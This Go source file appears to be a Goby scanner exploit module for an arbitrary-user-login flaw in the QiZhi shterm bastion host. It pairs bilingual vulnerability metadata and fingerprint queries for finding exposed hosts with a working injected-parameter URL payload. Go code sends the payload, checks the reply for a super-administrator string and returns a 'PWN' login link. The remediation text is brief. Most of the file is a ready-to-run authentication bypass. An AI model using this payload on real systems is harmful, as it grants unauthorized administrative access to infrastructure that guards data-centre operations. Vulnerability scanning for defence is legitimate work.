package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"strings"
)

func init() {
	expJson := `{
    "Name": "shterm(QiZhi) fortress Arbitrary user login",
    "Description": "Qizhi fortress machine any user login vulnerability",
    "Impact": "shterm(QiZhi) fortress Arbitrary user login",
    "Recommendation": "<p>1. Please contact the system manufacturer for repair and upgrade: http://www.shterm.com/</p><p>2. If not necessary, prohibit public network access the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "Product": "Qizhi-Bastion-Host",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "齐治科技运维操作管理系统（堡垒机）任意用户登录",
            "Description": "齐治科技RIS (Risk Insight System)数据中心风险洞察系统简称齐治堡垒机，是面向企业/事业单位及政府部门内部的数据中心运维安全 管理而推出的运维安全核心平台。",
            "Impact": "<p>齐治科技RIS (Risk Insight System)数据中心风险洞察系统简称齐治堡垒机，是面向企业/事业单位及政府部门内部的数据中心运维安全 管理而推出的运维安全核心平台。<br></p><p>该系统存在任意用户登录漏洞，攻击者可以构造特殊URL地址，从而登录任意用户界面。</p>",
            "Recommendation": "<p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">1、请联系系统厂商进行修复升级：<a href=\"http://www.shterm.com/\" rel=\"nofollow\">http://www.shterm.com/</a></span></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "齐治科技-堡垒机",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "shterm(QiZhi) fortress Arbitrary user login",
            "Description": "Qizhi fortress machine any user login vulnerability",
            "Impact": "shterm(QiZhi) fortress Arbitrary user login",
            "Recommendation": "<p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">1. Please contact the system manufacturer for repair and upgrade: <a href=\"http://www .shterm.com/\" rel=\"nofollow\">http://www.shterm.com/</a></span></p><p>2. If not necessary, prohibit public network access the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
            "Product": "Qizhi-Bastion-Host",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "body=\"class=\\\"forget_pwd hide\\\" href=\\\"#\\\" onclick=\\\"forgot_pwd();\" && body=\"var driver = DLLRegistered(\\\"XECtrl13.XFPAuthenExportX\\\");\"",
    "GobyQuery": "body=\"class=\\\"forget_pwd hide\\\" href=\\\"#\\\" onclick=\\\"forgot_pwd();\" && body=\"var driver = DLLRegistered(\\\"XECtrl13.XFPAuthenExportX\\\");\"",
    "Author": "go0p",
    "Homepage": "https://www.qzsec.com/",
    "DisclosureDate": "2021-04-08",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.3",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "超级管理员",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "超级管理员",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "shterm-Fortres-Machine"
        ]
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			path := "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + path); err == nil && strings.Contains(resp.RawBody, "超级管理员") {
				expResult.Output = "click <a href='goby://openLink?" +
					"url=" + expResult.HostInfo.FixedHostInfo + path +
					"'>PWN</a> for login "
				log.Println(expResult.Output)
				expResult.OutputType = "html"
				expResult.Success = true
			}
			return expResult
		},
	))
}
